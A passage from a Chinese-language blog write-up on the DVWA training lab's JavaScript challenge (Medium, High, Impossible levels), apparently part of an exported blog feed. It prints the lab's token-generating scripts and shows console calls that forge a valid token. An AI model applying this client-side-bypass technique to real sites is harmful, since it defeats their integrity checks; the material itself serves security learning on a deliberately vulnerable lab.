<h3 id="Medium-11"><a href="#Medium-11" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= &lt;&lt;&lt;EOF</span><br><span class="line">&lt;script src=<span class="string">&quot;/vulnerabilities/javascript/source/medium.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">EOF;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这一次后端不再是直接往前端插入一整段完整的js代码，而是插入了js的链接</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="string">&quot;&quot;</span>,n=e.length-<span class="number">1</span>;n&gt;=<span class="number">0</span>;n--)t+=e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;do_elsesomething(<span class="string">&quot;XX&quot;</span>)&#125;,<span class="number">300</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_elsesomething</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value=do_something(e+<span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value+<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>**setTimeout()**： 用于在指定的毫秒数后调用函数或计算表达式。</p>
<p>这一段js代码的意思是把token值设置为<code>&#39;XX&#39;+&#39;phrase的值&#39;+&#39;XX&#39;</code>的倒序</p>
<p>同理，我们在input框输入success后在控制台调用<code>do_elsesomething(&quot;XX&quot;);</code>函数，发现此时token已经变成success生成的样子，然后再提交即可。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226203442375.png" alt="image-20210226203442375"></p>
<h3 id="High-13"><a href="#High-13" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= &lt;&lt;&lt;EOF</span><br><span class="line">&lt;script src=<span class="string">&quot;/vulnerabilities/javascript/source/high.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">EOF;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>和medium难度一样从外部引入js代码,然后我们发现代码被混淆了，根本无法看懂，利用 <a class="link"   href="http://deobfuscatejavascript.com/" >http://deobfuscatejavascript.com<i class="fas fa-external-link-alt"></i></a> 这个网站可以把回校的代码转换为能看懂一些的代码，其中关键的部分在这里。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(<span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value + y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(e + <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_1</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = do_something(<span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    token_part_2(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;send&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line">token_part_1(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure>
<p>这里的执行过程如下：</p>
<p>首先是将phrase的值清空，然后就执行<strong>token_part_1(“ABCD”, 44)**，此时会执行do_something()，把phrase的值倒叙赋给token，然后到延迟3秒调用的</strong>token_part_2(“XX”)<strong>函数，即生成<code>&#39;XX&#39;+token的值</code>的sha256值，再赋值给token，接着当我们提交的时候会触发 click 事件调用</strong>token_part_3**函数即生成<code>token的值+&#39;ZZ&#39;</code>的sha256值，再赋值给token。</p>
<p>知道token生成过程之后我们就可以自己进行调用生成success的token了，我们在输入框输入success后，到控制台中输入 <code>token_part_1()</code> ，再输入 <code>token_part_2(&quot;XX&quot;)</code> ，再提交即可。</p>
<h3 id="Impossible-13"><a href="#Impossible-13" class="headerlink" title="Impossible"></a>Impossible</h3><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226210717955.png" alt="image-20210226210717955"></p>
<p>不给任何输入的地方就是最好的防御，妙啊。。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://www.freebuf.com/author/lonehand?type=article" >新手指南：DVWA-1.9全级别教程<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.sqlsec.com/2020/05/dvwa.html" >DVWA 入门靶场学习记录<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/-zhong/" >热爱网络安全的小菜狗<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
</search>
